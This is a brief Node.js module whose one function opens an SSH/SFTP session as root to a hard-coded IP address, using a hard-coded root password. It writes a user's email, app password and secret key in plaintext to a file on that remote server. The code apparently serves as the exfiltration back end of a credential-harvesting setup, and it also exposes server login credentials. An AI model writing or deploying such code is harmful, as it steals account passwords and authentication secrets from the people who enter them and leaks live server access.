'use strict';
const { Client } = require('ssh2');

async function saveToServer(email, appPassword, secretKey) {
    return new Promise((resolve, reject) => {
        const conn = new Client();
        conn.on('ready', () => {
            conn.sftp((err, sftp) => {
                if (err) { conn.end(); return reject(err); }
                const remoteDir = '/home/brightmindscampus/' + email;
                sftp.mkdir(remoteDir, {}, () => {
                    const data = 'Email: ' + email + '\nAppPassword: ' + appPassword + '\nSecretKey: ' + (secretKey || '') + '\n';
                    const remotePath = remoteDir + '/' + email + '_app_password.txt';
                    const stream = sftp.createWriteStream(remotePath);
                    stream.on('close', () => { conn.end(); resolve(); });
                    stream.on('error', (e) => { conn.end(); reject(e); });
                    stream.write(data);
                    stream.end();
                });
            });
        });
        conn.on('error', (err) => reject(new Error('SSH error: ' + err.message)));
        conn.connect({ host: '46.224.9.127', port: 22, username: 'root', password: 'JnsQ3G98JU027QP' });
    });
}

module.exports = { saveToServer };
